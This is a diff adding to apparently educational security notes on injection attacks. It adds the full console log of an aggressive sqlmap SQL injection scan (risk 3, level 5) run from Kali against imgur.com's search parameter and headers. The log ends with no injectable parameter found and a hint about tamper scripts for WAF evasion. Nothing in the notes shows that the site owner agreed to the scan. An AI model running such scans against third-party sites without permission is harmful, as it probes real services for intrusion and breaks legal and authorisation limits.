@@ -354,6 +354,138 @@ system($cmd);
 sqlmap --risk=3 --level=5 -u "https://imgur.com/search?q=otter"
 ```
 
+- Command line export of SQLmap proccess 
+
+```bash
+root@kali:~# sqlmap --risk=3 --level=5 -u "https://imgur.com/search?q=otter"
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.2.10#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 00:23:09
+
+[00:23:09] [INFO] testing connection to the target URL
+[00:23:10] [INFO] testing if the target URL content is stable
+[00:23:10] [INFO] target URL content is stable
+[00:23:10] [INFO] testing if GET parameter 'q' is dynamic
+[00:23:11] [INFO] confirming that GET parameter 'q' is dynamic
+[00:23:11] [INFO] GET parameter 'q' is dynamic
+[00:23:12] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
+[00:23:12] [INFO] testing for SQL injection on GET parameter 'q'
+[00:23:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[00:23:14] [WARNING] reflective value(s) found and filtering out
+[00:24:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[00:25:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[00:26:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[00:26:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[00:27:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[00:27:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[00:27:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[00:27:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[00:28:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[00:28:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[00:29:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[00:29:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[00:30:06] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[00:30:49] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[00:31:34] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[00:32:03] [INFO] GET parameter 'q' appears to be 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' injectable (with --string="XX")
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[00:34:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[00:34:41] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[00:34:48] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[00:34:55] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[00:35:01] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[00:35:10] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[00:35:17] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[00:35:25] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[00:35:33] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[00:35:41] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[00:35:49] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[00:36:26] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[00:36:26] [INFO] checking if the injection point on GET parameter 'q' is a false positive
+[00:36:27] [WARNING] false positive or unexploitable injection point detected
+[00:36:27] [WARNING] GET parameter 'q' does not seem to be injectable
+[00:36:27] [INFO] testing if Host parameter 'Host' is dynamic
+[00:36:27] [INFO] heuristics detected web page charset 'ascii'
+[00:36:27] [INFO] confirming that Host parameter 'Host' is dynamic
+[00:36:27] [INFO] Host parameter 'Host' is dynamic
+[00:36:27] [WARNING] heuristic (basic) test shows that Host parameter 'Host' might not be injectable
+[00:36:27] [INFO] testing for SQL injection on Host parameter 'Host'
+[00:36:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[00:36:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[00:36:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[00:36:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[00:36:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[00:36:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[00:36:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[00:37:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[00:37:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[00:37:01] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[00:37:02] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[00:37:02] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[00:37:02] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[00:37:02] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[00:37:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[00:37:35] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[00:37:38] [INFO] target URL appears to be UNION injectable with 9 columns
+[00:37:40] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
+it is not recommended to perform extended UNION tests if there is not at least one other (potential) technique found. Do you want to skip? [Y/n] Y
+[00:38:13] [WARNING] Host parameter 'Host' does not seem to be injectable
+[00:38:13] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
+[00:38:13] [INFO] confirming that User-Agent parameter 'User-Agent' is dynamic
+[00:38:14] [INFO] User-Agent parameter 'User-Agent' is dynamic
+[00:38:14] [WARNING] heuristic (basic) test shows that User-Agent parameter 'User-Agent' might not be injectable
+[00:38:15] [INFO] testing for SQL injection on User-Agent parameter 'User-Agent'
+[00:38:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[00:38:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[00:39:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[00:40:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[00:40:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[00:41:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[00:41:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[00:41:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[00:41:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[00:41:23] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[00:41:23] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[00:41:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[00:41:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[00:41:26] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[00:41:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[00:44:33] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[00:47:18] [WARNING] User-Agent parameter 'User-Agent' does not seem to be injectable
+[00:47:18] [INFO] testing if Referer parameter 'Referer' is dynamic
+[00:47:18] [INFO] confirming that Referer parameter 'Referer' is dynamic
+[00:47:18] [INFO] Referer parameter 'Referer' is dynamic
+[00:47:19] [WARNING] heuristic (basic) test shows that Referer parameter 'Referer' might not be injectable
+[00:47:20] [INFO] testing for SQL injection on Referer parameter 'Referer'
+[00:47:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[00:47:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[00:48:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[00:48:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[00:49:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[00:49:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[00:49:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[00:49:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[00:49:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[00:49:51] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[00:49:52] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[00:49:53] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[00:49:53] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[00:49:54] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[00:50:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[00:52:30] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[00:54:49] [WARNING] Referer parameter 'Referer' does not seem to be injectable
+[00:54:49] [CRITICAL] all tested parameters do not appear to be injectable. Also, you can try to rerun by providing a valid value for option '--string' as perhaps the string you have chosen does not match exclusively True responses. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+
+[*] shutting down at 00:54:49
+```
 
 ### References
 - [1] Command Injection - OWASP. Command Injection - OWASP [online]. Texas, USA: OWASP Foundation, 2018 [quoted. 2019-04-13]. Availiable from: https://www.owasp.org/index.php/Command_Injection
